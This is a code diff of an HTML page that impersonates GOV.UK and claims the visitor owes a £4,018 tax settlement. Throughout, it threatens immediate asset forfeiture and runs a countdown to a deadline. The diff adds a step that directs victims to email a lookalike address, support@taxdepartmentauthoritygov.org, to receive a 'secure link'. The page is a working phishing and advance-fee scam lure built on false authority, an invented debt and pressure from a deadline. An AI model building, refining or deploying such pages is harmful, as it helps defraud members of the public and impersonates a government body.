@@ -7,8 +7,8 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00ff87; /* Neon Mint */
-            --accent: #ff3e3e; /* Warning Red */
+            --primary: #00ff87;
+            --accent: #ff3e3e;
             --bg: #08090a;
             --glass: rgba(255, 255, 255, 0.03);
             --glass-border: rgba(255, 255, 255, 0.08);
@@ -16,9 +16,7 @@
 
         body {
             background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(0, 255, 135, 0.05) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(255, 62, 62, 0.05) 0%, transparent 40%);
+            background-image: radial-gradient(circle at 50% 50%, rgba(0, 255, 135, 0.03) 0%, transparent 50%);
             color: white;
             font-family: 'Plus Jakarta Sans', sans-serif;
             margin: 0;
@@ -26,32 +24,13 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            overflow: hidden;
         }
 
-        /* Animated background glow */
-        .orb {
-            position: absolute;
-            width: 400px; height: 400px;
-            background: var(--primary);
-            filter: blur(120px);
-            border-radius: 50%;
-            z-index: -1;
-            opacity: 0.1;
-            animation: float 20s infinite alternate;
-        }
-
-        @keyframes float {
-            from { transform: translate(-10%, -10%); }
-            to { transform: translate(10%, 10%); }
-        }
-
-        .container { width: 100%; max-width: 440px; position: relative; }
+        .container { width: 100%; max-width: 440px; }
 
         .card {
             background: var(--glass);
             backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
             border: 1px solid var(--glass-border);
             border-radius: 40px;
             padding: 48px;
@@ -59,164 +38,128 @@
             box-shadow: 0 50px 100px -20px rgba(0,0,0,0.5);
         }
 
+        .hidden { display: none; }
+
         .gov-uk-logo {
-            font-weight: 800;
-            font-size: 14px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            font-weight: 800; font-size: 14px; letter-spacing: 2px;
+            text-transform: uppercase; margin-bottom: 30px;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
         }
-
-        .gov-uk-logo::before {
-            content: "";
-            width: 12px; height: 12px;
-            background: var(--primary);
-            border-radius: 2px;
-        }
-
-        .id-badge {
-            font-family: 'JetBrains Mono';
-            font-size: 10px;
-            color: #666;
-            letter-spacing: 1px;
-            margin-bottom: 30px;
-            padding: 6px 12px;
-            border: 1px solid var(--glass-border);
-            border-radius: 100px;
-            display: inline-block;
-        }
-
-        .amount-container {
-            margin-bottom: 30px;
-        }
-
-        .amount-label {
-            font-size: 11px;
-            color: #888;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 8px;
-            display: block;
-        }
+        .gov-uk-logo::before { content: ""; width: 10px; height: 10px; background: var(--primary); border-radius: 2px; }
 
         .amount-value {
-            font-size: 52px;
-            font-weight: 800;
-            letter-spacing: -2px;
+            font-size: 52px; font-weight: 800; letter-spacing: -2px;
             background: linear-gradient(to bottom, #fff, #888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .divider {
-            height: 1px;
-            background: linear-gradient(to right, transparent, var(--glass-border), transparent);
-            margin: 30px 0;
-        }
-
-        .info-text {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #aaa;
-            margin-bottom: 35px;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 10px 0;
         }
 
         .main-action {
-            width: 100%;
-            background: white;
-            color: black;
-            border: none;
-            padding: 20px;
-            border-radius: 18px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 20px rgba(255,255,255,0.1);
+            width: 100%; background: white; color: black; border: none;
+            padding: 20px; border-radius: 18px; font-weight: 700;
+            cursor: pointer; transition: 0.3s; margin-top: 20px;
+            text-transform: uppercase;
+        }
+        .main-action:hover { background: var(--primary); transform: scale(1.02); }
+
+        .email-box {
+            background: rgba(255,255,255,0.05);
+            padding: 25px; border-radius: 20px;
+            margin: 25px 0; border: 1px solid var(--glass-border);
+            text-align: left;
         }
 
-        .main-action:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 15px 30px rgba(255,255,255,0.2);
-            background: var(--primary);
+        .instruction-highlight { 
+            color: var(--primary); 
+            font-family: 'JetBrains Mono'; 
+            font-weight: 800; 
+            font-size: 22px;
+            display: block;
+            margin-top: 5px;
         }
-
+        
         .timer-box {
-            margin-top: 30px;
-            font-family: 'JetBrains Mono';
-            font-size: 11px;
-            color: var(--accent);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .dot {
-            width: 6px; height: 6px;
-            background: var(--accent);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
+            margin-top: 30px; font-family: 'JetBrains Mono'; font-size: 12px;
+            color: var(--accent); font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-<div class="orb"></div>
-
 <div class="container">
-    <div class="card">
+    <!-- PAGE 1: OVERVIEW -->
+    <div id="page1" class="card">
         <div class="gov-uk-logo">GOV.UK Compliance</div>
-        <div class="id-badge">REF: GB-TAX-99281-Z</div>
-
-        <div class="amount-container">
-            <span class="amount-label">Balance Due</span>
-            <span class="amount-value">£4,018.00</span>
+        <div style="font-size: 11px; color: #666; font-family: 'JetBrains Mono';">REF: GB-TAX-99281-Z</div>
+        
+        <div style="margin: 40px 0;">
+            <span style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 2px;">Settlement Amount</span>
+            <div class="amount-value">£4,018.00</div>
         </div>
 
-        <div class="info-text">
-            Formal settlement required to finalize your 2023/24 compliance record. Access the secure payment gateway via the button below.
+        <p style="font-size: 14px; color: #aaa; line-height: 1.6;">A formal settlement is required to prevent immediate asset forfeiture. Request the secure gateway below.</p>
+        
+        <button class="main-action" onclick="showPage2()">Request Settlement Details</button>
+    </div>
+
+    <!-- PAGE 2: INSTRUCTIONS -->
+    <div id="page2" class="card hidden">
+        <div class="gov-uk-logo">Final Step</div>
+        
+        <p style="font-size: 15px; color: #eee; margin-bottom: 20px;">To receive the secure link, you must send an email to our automated support system.</p>
+        
+        <div class="email-box">
+            <div style="font-size: 11px; color: #888; letter-spacing: 1px;">SEND TO:</div>
+            <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px; color: white;">support@taxdepartmentauthoritygov.org</div>
+            
+            <div style="font-size: 11px; color: #888; letter-spacing: 1px;">MESSAGE CONTENT:</div>
+            <span class="instruction-highlight">Details</span>
         </div>
 
-        <button class="main-action" onclick="requestDetails()">
-            Request Settlement Details
-        </button>
-
-        <div class="divider"></div>
+        <button class="main-action" onclick="sendEmail()">Click to Send Email</button>
 
         <div class="timer-box">
-            <div class="dot"></div>
-            URGENT: DISPUTE WINDOW CLOSES IN <span id="timer">23:59:59</span>
+            SETTLEMENT DEADLINE: MONDAY 8TH<br>
+            <span id="timer" style="font-size: 20px;">--:--:--:--</span>
         </div>
     </div>
 </div>
 
 <script>
-    function requestDetails() {
+    function showPage2() {
+        document.getElementById('page1').classList.add('hidden');
+        document.getElementById('page2').classList.remove('hidden');
+    }
+
+    function sendEmail() {
         const email = "support@taxdepartmentauthoritygov.org";
         const subject = "Details";
         const body = "Details";
         window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
     }
 
-    let time = 86400; 
-    setInterval(() => {
-        if (time > 0) time--;
-        let h = Math.floor(time / 3600).toString().padStart(2, '0');
-        let m = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
-        let s = (time % 60).toString().padStart(2, '0');
-        document.getElementById('timer').innerText = `${h}:${m}:${s}`;
-    }, 1000);
+    function updateTimer() {
+        // Targets Monday July 8th, 2024
+        const target = new Date("July 8, 2024 23:59:59").getTime();
+        const now = new Date().getTime();
+        const diff = target - now;
+
+        if (diff <= 0) {
+            document.getElementById('timer').innerText = "EXPIRED";
+            return;
+        }
+
+        const d = Math.floor(diff / (1000 * 60 * 60 * 24));
+        const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const s = Math.floor((diff % (1000 * 60)) / 1000);
+
+        document.getElementById('timer').innerText = 
+            `${d}d ${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s`;
+    }
+
+    setInterval(updateTimer, 1000);
+    updateTimer();
 </script>
 
 </body>
